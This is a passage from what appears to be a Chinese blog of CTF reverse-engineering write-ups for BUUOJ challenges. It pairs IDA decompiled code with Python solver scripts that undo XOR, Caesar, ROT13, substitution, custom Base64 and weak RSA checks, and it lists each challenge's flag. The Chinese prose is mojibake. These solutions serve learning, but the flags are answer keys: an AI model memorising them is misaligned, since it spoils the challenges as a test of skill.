0xFFFFFFFFLL; &#125;LABEL_13: if ( __readfsqword(0x28u) != v54 ) sub_444020(); return result;&#125; å¯ä»¥çœ‹åˆ°v10å’Œoff_6CC090è¿›è¡Œæ¯”è¾ƒ, ç›¸åŒåˆ™è¾“å‡ºå­—ç¬¦ä¸² è€Œoff_6CC090ä¸ºä¸€æ®µBase64ç¼–ç  1Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ== ç»“åˆå‰é¢çš„ä»£ç , å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºè¾“å…¥çš„å­—ç¬¦ä¸²è¿›è¡Œ10æ¬¡Base64ç¼–ç ä¹‹åä¸è¿™æ®µBase64ç¼–ç ç›¸æ¯”è¾ƒ å¾—åˆ°çš„å†…å®¹ä¸ºhttps://bbs.pediy.com/thread-254172.htm æ˜¾ç„¶è¿™ä¸æ˜¯flag 12345678for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i ) &#123; if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) ) &#123; result = 4294967294LL; goto LABEL_13; &#125; &#125; è¿™æ®µä»£ç åˆ™å°†è¾“å…¥å€¼ä¸ä¸‹æ ‡å¼‚æˆ–ä¹‹åä¸ä¸€ä¸ªå›ºå®šå€¼ç›¸æ¯”è¾ƒ, åˆ™å¯ä»¥é€†å‘å¾—å‡ºæ­£ç¡®è¾“å…¥å€¼ 123456#!/usr/bin/env python3string = [73, 111, 100, 108, 62, 81, 110, 98, 40, 111, 99, 121, 127, 121, 46, 105, 127, 100, 96, 51, 119, 125, 119, 101, 107, 57, 123, 105, 121, 61, 126, 121, 76, 64, 69, 67]flag = &quot;&quot;for _ in range(len(string)): flag += chr(string[_]^_)print(flag) Info:The first four chars are flag è€Œåœ¨å†…å­˜åˆ†å¸ƒä¸­off_6CC090çš„ä¸‹é¢å­˜åœ¨å¦å¤–ä¸€æ®µå­—ç¬¦ä¸²qword_6CC0A0 123456qword_6CC0A0 = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B] IDAä¸­å³é”®-&gt;Xrefs graph to..., å¾—åˆ°å‡½æ•°sub_400D35 12345678910111213141516171819202122232425262728293031__int64 sub_400D35()&#123; __int64 result; // rax unsigned __int64 v1; // rt1 unsigned int v2; // [rsp+Ch] [rbp-24h] signed int i; // [rsp+10h] [rbp-20h] signed int j; // [rsp+14h] [rbp-1Ch] unsigned int v5; // [rsp+24h] [rbp-Ch] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); v2 = sub_43FD20() - qword_6CEE38; for ( i = 0; i &lt;= 1233; ++i ) &#123; sub_40F790(v2); sub_40FE60(v2); sub_40FE60(v2); v2 = (unsigned __int64)sub_40FE60(v2) ^ 0x98765432; &#125; v5 = v2; if ( ((unsigned __int8)v2 ^ qword_6CC0A0[0]) == &#x27;f&#x27; &amp;&amp; (HIBYTE(v5) ^ qword_6CC0A0[3]) == &#x27;g&#x27; ) &#123; for ( j = 0; j &lt;= 24; ++j ) sub_410E90(qword_6CC0A0[j] ^ *((_BYTE *)&amp;v5 + j % 4)); &#125; v1 = __readfsqword(0x28u); result = v1 ^ v6; if ( v1 != v6 ) sub_444020(); return result;&#125; è€Œflagå‰å››å­—èŠ‚ä¸º&quot;flag&quot;, v5é•¿åº¦ä¹Ÿä¸º4å­—èŠ‚ å³å¯é€šè¿‡å·²çŸ¥æ˜æ–‡éƒ¨åˆ†æ¥å¾—å‡ºv5, å†é€šè¿‡v5å¾—å‡ºflag 123456789string1 = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]string2 = &quot;flag&quot;key = []flag = &quot;&quot;for _ in range(len(string2)): key.append(ord(string2[_])^string1[_])for _ in range(len(string1)): flag += chr(string1[_]^key[_%4])print(flag) flag{Act1ve_Defen5e_Test} [ACTFæ–°ç”Ÿèµ›2020]rome é“¾æ¥: https://buuoj.cn/challenges#[ACTFæ–°ç”Ÿèµ›2020]rome EXE 32 IDAä¸­å‡½æ•° func çš„åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899int func()&#123; int result; // eax int v1; // [esp+14h] [ebp-44h] int v2; // [esp+18h] [ebp-40h] int v3; // [esp+1Ch] [ebp-3Ch] int v4; // [esp+20h] [ebp-38h] unsigned __int8 v5; // [esp+24h] [ebp-34h] char c1[22]; unsigned __int8 v6; // [esp+25h] [ebp-33h] unsigned __int8 v7; // [esp+26h] [ebp-32h] unsigned __int8 v8; // [esp+27h] [ebp-31h] unsigned __int8 v9; // [esp+28h] [ebp-30h] int v10; // [esp+29h] [ebp-2Fh] int v11; // [esp+2Dh] [ebp-2Bh] int v12; // [esp+31h] [ebp-27h] int v13; // [esp+35h] [ebp-23h] unsigned __int8 v14; // [esp+39h] [ebp-1Fh] c1 end char v15; // [esp+3Bh] [ebp-1Dh] char v16; // [esp+3Ch] [ebp-1Ch] char v17; // [esp+3Dh] [ebp-1Bh] char v18; // [esp+3Eh] [ebp-1Ah] char v19; // [esp+3Fh] [ebp-19h] char v20; // [esp+40h] [ebp-18h] char v21; // [esp+41h] [ebp-17h] char v22; // [esp+42h] [ebp-16h] char v23; // [esp+43h] [ebp-15h] char v24; // [esp+44h] [ebp-14h] char v25; // [esp+45h] [ebp-13h] char v26; // [esp+46h] [ebp-12h] char v27; // [esp+47h] [ebp-11h] char v28; // [esp+48h] [ebp-10h] char v29; // [esp+49h] [ebp-Fh] char v30; // [esp+4Ah] [ebp-Eh] char v31; // [esp+4Bh] [ebp-Dh] int i; // [esp+4Ch] [ebp-Ch] v15 = 81; v16 = 115; v17 = 119; v18 = 51; v19 = 115; v20 = 106; v21 = 95; v22 = 108; v23 = 122; v24 = 52; v25 = 95; v26 = 85; v27 = 106; v28 = 119; v29 = 64; v30 = 108; v31 = 0; printf(&quot;Please input:&quot;); scanf(&quot;%s&quot;, &amp;v5); result = v5; if ( v5 == &#x27;A&#x27; ) &#123; result = v6; if ( v6 == &#x27;C&#x27; ) &#123; result = v7; if ( v7 == &#x27;T&#x27; ) &#123; result = v8; if ( v8 == &#x27;F&#x27; ) &#123; result = v9; if ( v9 == &#x27;&#123;&#x27; ) &#123; result = v14; if ( v14 == &#x27;&#125;&#x27; ) &#123; v1 = v10; v2 = v11; v3 = v12; v4 = v13; for ( i = 0; i &lt;= 15; ++i ) &#123; if ( *((_BYTE *)&amp;v1 + i) &gt; 64 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 90 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 51) % 26 + 65; if ( *((_BYTE *)&amp;v1 + i) &gt; 96 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 122 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 79) % 26 + 97; &#125; for ( i = 0; i &lt;= 15; ++i ) &#123; result = (unsigned __int8)*(&amp;v15 + i); if ( *((_BYTE *)&amp;v1 + i) != (_BYTE)result ) return result; &#125; result = printf(&quot;You are correct!&quot;); &#125; &#125; &#125; &#125; &#125; &#125; return result;&#125; 12345678for ( i = 0; i &lt;= 15; ++i )&#123; if ( *((_BYTE *)&amp;v1 + i) &gt; 64 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 90 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 51) % 26 + 65; if ( *((_BYTE *)&amp;v1 + i) &gt; 96 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 122 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 79) % 26 + 97;&#125; é‡ç‚¹çœ‹è¿™æ®µä»£ç  *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 51) % 26 + 65; ä¸ä¸‹é¢çš„å†™æ³•ç­‰æ•ˆ *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 65 + 14) % 26 + 65; é‚£ä¹ˆæ˜¾è€Œæ˜“è§å¾—å°±æ˜¯å‡¯æ’’å¯†ç äº† 123456789101112#!/usr/bin/env python3cipher = [81, 115, 119, 51, 115, 106, 95, 108, 122, 52, 95, 85, 106, 119, 64, 108]flag = &quot;flag&#123;&quot;for _ in cipher: if _ in range(65, 91): flag += chr(((_-65-14)%26)+65) elif _ in range(97, 123): flag += chr(((_-97-18)%26)+97) else: flag += chr(_)flag += &quot;&#125;&quot;print(flag) flag{Cae3ar_th4_Gre@t} Youngter-drive é“¾æ¥: https://buuoj.cn/challenges#Youngter-drive EXE 32 å­˜åœ¨UPXå£³, è„±å£³åIDAä¸­ _main_0 å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718int main_0()&#123; HANDLE v2; // [esp+D0h] [ebp-14h] HANDLE hObject; // [esp+DCh] [ebp-8h] sub_4110FF(); ::hObject = CreateMutexW(0, 0, 0); j_strcpy(Dest, Source); hObject = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0); v2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_41119F, 0, 0, 0); CloseHandle(hObject); CloseHandle(v2); while ( dword_418008 != -1 ) ; sub_411190(); CloseHandle(::hObject); return 0;&#125; è¿™é‡Œå¯ä»¥çœ‹åˆ°ç¨‹åºä½¿ç”¨äº†å¤šçº¿ç¨‹ åˆ†åˆ«è·Ÿè¿›ä¸¤ä¸ªçº¿ç¨‹ä¸­æ‰€è¿è¡Œçš„å‡½æ•° 1234567891011121314void __stdcall StartAddress_0(int a1)&#123; while ( 1 ) &#123; WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 &gt; -1 ) &#123; sub_41112C((int)Source, dword_418008); --dword_418008; Sleep(0x64u); &#125; ReleaseMutex(hObject); &#125;&#125; 12345678910111213void __stdcall sub_411B10(int a1)&#123; while ( 1 ) &#123; WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 &gt; -1 ) &#123; Sleep(0x64u); --dword_418008; &#125; ReleaseMutex(hObject); &#125;&#125; hObjectå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡è¯†, å…ˆè¿è¡ŒStartAddress_0, æ­¤æ—¶hObjectä¸ºç©ºé—²çŠ¶æ€ WaitForSingleObjectåœ¨hObjectä¸ºç©ºé—²çŠ¶æ€æ—¶å¯ä»¥è¿è¡Œåç»­çš„ä»£ç , å¹¶å°†hObjectè®¾ç½®ä¸ºç¹å¿™çŠ¶æ€, ç›´åˆ°åç»­ä»£ç è¿è¡Œç»“æŸä¹‹åå†è¿è¡Œå‡½æ•°ReleaseMutex, å°†hObjectä¸ºç©ºé—²çŠ¶æ€è®¾ç½®ä¸ºç©ºé—²çŠ¶æ€ è€Œå½“hObjectä¸ºç©ºé—²çŠ¶æ€ä¹‹å‰, å‡½æ•°sub_411B10éƒ½åœ¨è¿è¡ŒWaitForSingleObject, å³ç­‰å¾…hObjectå˜ä¸ºç©ºé—²çŠ¶æ€ é‚£ä¹ˆå‡½æ•°StartAddress_0, sub_411B10å°†äº¤æ›¿è¿è¡Œ 1234567891011121314151617181920char *__cdecl sub_411940(int a1, int a2)&#123; char *result; // eax char v3; // [esp+D3h] [ebp-5h] v3 = *(_BYTE *)(a2 + a1); if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) ) exit(0); if ( v3 &lt; 97 || v3 &gt; 122 ) &#123; result = off_418000[0]; *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 38]; &#125; else &#123; result = off_418000[0]; *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 96]; &#125; return result;&#125; å‡½æ•°sub_411940ç”¨äºæ›¿æ¢æ‰€è¾“å…¥çš„Sourceå­—ç¬¦ä¸² off_418000[0][*(char *)(a2 + a1) - 38]è¡¨é¢ä¸Šæ˜¯ä¸ªäºŒç»´æ•°ç»„, ä½†æ˜¯ç¬¬ä¸€ç»´åªæœ‰ä¸€ä¸ªå€¼, æ‰€ä»¥å½“ä¸€ç»´æ•°ç»„å¤„ç†å³å¯ dword_418008 = 29 off_418000 = â€œQWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnmâ€ æœ€åè¿è¡Œå‡½æ•°sub_411880(), ç”¨äºæ ¡éªŒè¢«æ›¿æ¢ä¹‹åçš„flagæ˜¯å¦æ­£ç¡® 1234567891011int sub_411880()&#123; int i; // [esp+D0h] [ebp-8h] for ( i = 0; i &lt; 29; ++i ) &#123; if ( Source[i] != off_418004[i] ) exit(0); &#125; return printf(&quot;\\nflag&#123;%s&#125;\\n\\n&quot;, Dest);&#125; off_418004 = â€œTOiZiZtOrYaToUwPnToBsOaOapsySâ€ 12345678910111213#!/usr/bin/env python3source = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;off = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;flag = &quot;flag&#123;&quot;for _ in range(len(source)): if _%2 == 0: flag += source[_] elif ord(source[_]) &lt; 97: flag += chr(off.index(source[_])+96) else: flag += chr(off.index(source[_])+38)flag += &quot;&#125;&quot;print(flag) ç”±äºæœªçŸ¥åŸå› , éœ€è¦åŠ ä¸Šä¸€ä¸ª'E'æ‰èƒ½æ­£ç¡®æäº¤flag å¦å¤–ä¸€ç‚¹, dword_418008 = 29, è€Œå­—ç¬¦ä¸²é•¿åº¦ä¹Ÿä¸º29 åœ¨è®¿é—®off_418004[29]æ—¶ç†è®ºä¸Šæ˜¯è®¿é—®åˆ°\\x00 é‚£ä¹ˆæ›¿æ¢æ—¶, ä¼šè¢«off_418000[0][-38]æ‰€æ›¿æ¢ flag{ThisisthreadofwindowshahaIsESE} [FlareOn4]login é“¾æ¥: https://buuoj.cn/challenges#[FlareOn4]login Javascript 123456789document.getElementById(&quot;prompt&quot;).onclick = function () &#123; var flag = document.getElementById(&quot;flag&quot;).value; var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;); if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) &#123; alert(&quot;Correct flag!&quot;); &#125; else &#123; alert(&quot;Incorrect flag, rot again&quot;); &#125;&#125; ç”±äºä¸ç†Ÿæ‚‰JS, åªèƒ½é€šè¿‡åœ¨æµè§ˆå™¨Consoleä¸­è¿è¡ŒJSæ¥åˆ¤æ–­åŠ å¯†æ–¹æ³• 12345flag = &quot;abcdefghjklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&amp;*()_+-=&quot;&quot;abcdefghjklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&amp;*()_+-=&quot;------flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;);&quot;nopqrstuwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM`~!@#$%^&amp;*()_+-=&quot; rot13 1234567891011#!/usr/bin/env python3cipher = &quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;flag = &quot;&quot;for _ in cipher: if 65&lt;=ord(_)&lt;=90: flag += chr((ord(_)-65+13)%26+65) elif 97&lt;=ord(_)&lt;=122: flag += chr((ord(_)-97+13)%26+97) else: flag += _print(flag) flag{ClientSideLoginsAreEasy@flare-on.com} [GUET-CTF2019]re é“¾æ¥: https://buuoj.cn/challenges#[GUET-CTF2019]re ELF 64 UPXè„±å£³ å­—ç¬¦ä¸²aInputYourFlag -&gt; sub_400E28 -&gt; sub_4009AE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364_BOOL8 __fastcall sub_4009AE(char *a1)&#123; if ( 1629056 * *a1 != 166163712 ) return 0LL; if ( 6771600 * a1[1] != 731332800 ) return 0LL; if ( 3682944 * a1[2] != 357245568 ) return 0LL; if ( 10431000 * a1[3] != 1074393000 ) return 0LL; if ( 3977328 * a1[4] != 489211344 ) return 0LL; if ( 5138336 * a1[5] != 518971936 ) return 0LL; if ( 7532250 * a1[7] != 406741500 ) return 0LL; if ( 5551632 * a1[8] != 294236496 ) return 0LL; if ( 3409728 * a1[9] != 177305856 ) return 0LL; if ( 13013670 * a1[10] != 650683500 ) return 0LL; if ( 6088797 * a1[11] != 298351053 ) return 0LL; if ( 7884663 * a1[12] != 386348487 ) return 0LL; if ( 8944053 * a1[13] != 438258597 ) return 0LL; if ( 5198490 * a1[14] != 249527520 ) return 0LL; if ( 4544518 * a1[15] != 445362764 ) return 0LL; if ( 3645600 * a1[17] != 174988800 ) return 0LL; if ( 10115280 * a1[16] != 981182160 ) return 0LL; if ( 9667504 * a1[18] != 493042704 ) return 0LL; if ( 5364450 * a1[19] != 257493600 ) return 0LL; if ( 13464540 * a1[20] != 767478780 ) return 0LL; if ( 5488432 * a1[21] != 312840624 ) return 0LL; if ( 14479500 * a1[22] != 1404511500 ) return 0LL; if ( 6451830 * a1[23] != 316139670 ) return 0LL; if ( 6252576 * a1[24] != 619005024 ) return 0LL; if ( 7763364 * a1[25] != 372641472 ) return 0LL; if ( 7327320 * a1[26] != 373693320 ) return 0LL; if ( 8741520 * a1[27] != 498266640 ) return 0LL; if ( 8871876 * a1[28] != 452465676 ) return 0LL; if ( 4086720 * a1[29] != 208422720 ) return 0LL; if ( 9374400 * a1[30] == 515592000 ) return 5759124 * a1[31] == 719890500; return 0LL;&#125; ä¸¤ä¸ªå‘ æ²¡æœ‰ç»™å‡ºa1[6] a[17]å’Œa[16]è°ƒæ¢é¡ºåº 1234567#!/usr/bin/env python3num1 = [1629056, 6771600, 3682944, 10431000, 3977328, 5138336, 7532250, 5551632, 3409728, 13013670, 6088797, 7884663, 8944053, 5198490, 4544518, 10115280, 3645600, 9667504, 5364450, 13464540, 5488432, 14479500, 6451830, 6252576, 7763364, 7327320, 8741520, 8871876, 4086720, 9374400, 5759124]num2 = [166163712, 731332800, 357245568, 1074393000, 489211344, 518971936, 406741500, 294236496, 177305856, 650683500, 298351053, 386348487, 438258597, 249527520, 445362764, 981182160, 174988800, 493042704, 257493600, 767478780, 312840624, 1404511500, 316139670, 619005024, 372641472, 373693320, 498266640, 452465676, 208422720, 515592000, 719890500]flag = &quot;&quot;for _ in range(len(num1)): flag += chr(num2[_] // num1[_])print(flag) æœ€åéœ€è¦çˆ†ç ´flag[6] flag{e165421110ba03099a1c039337} [SUCTF2019]SignIn é“¾æ¥: https://buuoj.cn/challenges#[SUCTF2019]SignIn ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 1234567891011121314151617181920212223242526272829__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+0h] [rbp-4A0h] char v5; // [rsp+10h] [rbp-490h] char v6; // [rsp+20h] [rbp-480h] char v7; // [rsp+30h] [rbp-470h] char v8; // [rsp+40h] [rbp-460h] char v9; // [rsp+B0h] [rbp-3F0h] unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(&quot;[sign in]&quot;); printf(&quot;[input your flag]: &quot;, a2); __isoc99_scanf(&quot;%99s&quot;, &amp;v8); sub_96A(&amp;v8, (__int64)&amp;v9); __gmpz_init_set_str((__int64)&amp;v7, (__int64)&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);// c __gmpz_init_set_str((__int64)&amp;v6, (__int64)&amp;v9, 16LL);// m __gmpz_init_set_str( (__int64)&amp;v4, (__int64)&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;,// n 10LL); __gmpz_init_set_str((__int64)&amp;v5, (__int64)&quot;65537&quot;, 10LL);// e __gmpz_powm((__int64)&amp;v6, (__int64)&amp;v6, (__int64)&amp;v5, (__int64)&amp;v4);// v6=v6**v5%v4 if ( (unsigned int)__gmpz_cmp(&amp;v6, &amp;v7) ) puts(&quot;GG!&quot;); else puts(&quot;TTTTTTTTTTql!&quot;); return 0LL;&#125; å‡½æ•°__gmpz_powm((__int64)&amp;v6, (__int64)&amp;v6, (__int64)&amp;v5, (__int64)&amp;v4)æ„ä¸º v6 = (v6**v5)%v4 æœ€åæ¯”è¾ƒv6ä¸v7 æ‰€ä»¥å¾ˆæ˜æ˜¾å°±æ˜¯RSA 123456789101112#!/usr/bin/env python3from Crypto.Util.number import *p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419e = 65537c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35n = p * qphi = (p - 1)*(q - 1)d = inverse(e, phi)m = pow(c, d, n)flag = long_to_bytes(m)print(flag) flag{Pwn_@_hundred_years} ç›¸å†Œ é“¾æ¥: https://buuoj.cn/challenges#ç›¸å†Œ Android ä¸‹è½½å¾—åˆ°ä¸€ä¸ªAPkåŒ…, æå–class.dexæ–‡ä»¶è½¬jarä¹‹åä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¿¡æ¯ æå–libcore.soåˆ°IDAä¸­çœ‹çœ‹ çœ‹åˆ°ä¸€æ®µBase64å­—ç¬¦ä¸²MTgyMTg0NjUxMjVAMTYzLmNvbQ== è§£ç ä¹‹åä¸º18218465125@163.com å³ä¸ºflag flag{18218465125@163.com} [BJDCTF2020]easy é“¾æ¥: https://buuoj.cn/challenges#[BJDCTF2020]easy EXE 32 IDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; time_t v4; // [esp+10h] [ebp-3F0h] struct tm *v5; // [esp+3FCh] [ebp-4h] __main(); time(&amp;v4); v5 = localtime(&amp;v4); puts(&quot;Can you find me?\\n&quot;); system(&quot;pause&quot;); return 0;&#125; æ²¡æœ‰å¾—åˆ°å…³äºflagçš„ä¿¡æ¯ ç»§ç»­æŸ¥çœ‹å…¶ä»–å‡½æ•° å‡½æ•° _ques æœ‰æ•°æ®ä»¥åŠè¾“å‡º ä¿®æ”¹ä¸€ä¸‹åç¼–è¯‘ä¹‹åçš„ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#define SHIDWORD(x) (*((__int32*)&amp;(x)+1))#define LODWORD(x) (*((__int32*)&amp;(x)))#define HIDWORD(x) (*((__int32*)&amp;(x)+1))#include &lt;stdio.h&gt;int main(void)&#123; int v0; int result; int v2[50]; int v3[10] = &#123;2147122737, 140540, 2286567993, 141956, 139457077, 262023, 2286043699, 143749, 2118271985, 143868&#125;; int j; __int64 v14; int v15; int v16; int i; for ( i = 0; i &lt;= 4; ++i ) &#123; memset(v2, 0, sizeof(v2)); v16 = 0; v15 = 0; v0 = *(&amp;v3[1] + 2 * i); LODWORD(v14) = *(&amp;v3[0] + 2 * i); HIDWORD(v14) = v0; while ( SHIDWORD(v14) &gt; 0 || v14 &gt;= 0 &amp;&amp; (__int32)v14 ) &#123; v2[v16++] = ((SHIDWORD(v14) &gt;&gt; 31) ^ (((unsigned __int8)(SHIDWORD(v14) &gt;&gt; 31) ^ (unsigned __int8)v14) - (unsigned __int8)(SHIDWORD(v14) &gt;&gt; 31)) &amp; 1) - (SHIDWORD(v14) &gt;&gt; 31); v14 /= 2LL; &#125; for ( j = 50; j &gt;= 0; --j ) &#123; if ( v2[j] ) &#123; if ( v2[j] == 1 ) &#123; putchar(42); ++v15; &#125; &#125; else &#123; putchar(32); ++v15; &#125; if ( !(v15 % 5) ) putchar(32); &#125; result = putchar(10); &#125; return 0;&#125; è¿è¡Œå³å¯å¾—åˆ°flag IDA Proåç¼–è¯‘ä»£ç ç±»å‹è½¬æ¢å‚è€ƒ flag{HACKIT4FUN} [ACTFæ–°ç”Ÿèµ›2020]usualCrypt é“¾æ¥: https://buuoj.cn/challenges#[ACTFæ–°ç”Ÿèµ›2020]usualCrypt EXE 32 IDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // esi int result; // eax int v5; // [esp+8h] [ebp-74h] int v6; // [esp+Ch] [ebp-70h] int v7; // [esp+10h] [ebp-6Ch] __int16 v8; // [esp+14h] [ebp-68h] char v9; // [esp+16h] [ebp-66h] char v10; // [esp+18h] [ebp-64h] sub_403CF8(&amp;unk_40E140); scanf(aS, &amp;v10); v5 = 0; v6 = 0; v7 = 0; v8 = 0; v9 = 0; sub_401080((int)&amp;v10, strlen(&amp;v10), (int)&amp;v5); v3 = 0; while ( *((_BYTE *)&amp;v5 + v3) == byte_40E0E4[v3] ) &#123; if ( ++v3 &gt; strlen((const char *)&amp;v5) ) goto LABEL_6; &#125; sub_403CF8(aError);LABEL_6: if ( v3 - 1 == strlen(byte_40E0E4) ) result = sub_403CF8(aAreYouHappyYes); else result = sub_403CF8(aAreYouHappyNo); return result;&#125; å‡½æ•° sub_401080 å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œå˜æ¢ ç»§ç»­æµè§ˆä¿¡æ¯å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªå­—ç¬¦ä¸² 12char byte_40E0A0[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;char *byte_40E0AA = &amp;byte_40E0A0[10]; ä¸¤ä¸ªå­—ç¬¦ä¸²çš„å…³ç³»å¤§æ¦‚æ˜¯è¿™æ · å¾ˆæ˜æ˜¾æ˜¯åœ¨è¿›è¡ŒBase64ç¼–ç çš„æ“ä½œ ä½†æ˜¯åœ¨ç¼–ç å‰æœ‰å‡½æ•° sub_401000, ç¼–ç åæœ‰å‡½æ•° sub_401030 123456789101112131415signed int sub_401000()&#123; signed int result; // eax char v1; // cl result = 6; do &#123; v1 = byte_40E0AA[result]; byte_40E0AA[result] = byte_40E0A0[result]; byte_40E0A0[result++] = v1; &#125; while ( result &lt; 15 ); return result;&#125; è¿™ä¸ªå‡½æ•°çš„è¯å¤§æ¦‚å°±æ˜¯åœ¨è°ƒæ¢Base64ç¼–ç è¡¨, å¼„æ¸…æ¥šä¸¤ä¸ªå­—ç¬¦ä¸²çš„å…³ç³»å³å¯ 123456789101112131415161718192021222324252627282930int __cdecl sub_401030(const char *a1)&#123; __int64 v1; // rax char v2; // al v1 = 0i64; if ( strlen(a1) != 0 ) &#123; do &#123; v2 = a1[HIDWORD(v1)]; if ( v2 &lt; 97 || v2 &gt; 122 ) &#123; if ( v2 &lt; 65 || v2 &gt; 90 ) goto LABEL_9; LOBYTE(v1) = v2 + 32; &#125; else &#123; LOBYTE(v1) = v2 - 32; &#125; a1[HIDWORD(v1)] = v1;LABEL_9: LODWORD(v1) = 0; ++HIDWORD(v1); &#125; while ( HIDWORD(v1) &lt; strlen(a1) ); &#125; return v1;&#125; å¤§å°å†™è½¬æ¢ 12345678910111213141516171819#!/usr/bin/env python3import base64cipher1 = &quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;cipher2 = cipher1.swapcase() # re_sub_401030cipher3 = &quot;&quot;table1 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;table_lst = []for _ in table1: table_lst.append(_)offset = 10for i in range(6, 15): # re_sub_401000 tmp = table_lst[i+offset] table_lst[i+offset] = table_lst[i] table_lst[i] = tmptable2 = &quot;&quot;.join(table_lst)for _ in cipher2: cipher3 += table1[table2.index(_)]flag = base64.b64decode(cipher3)print(flag) 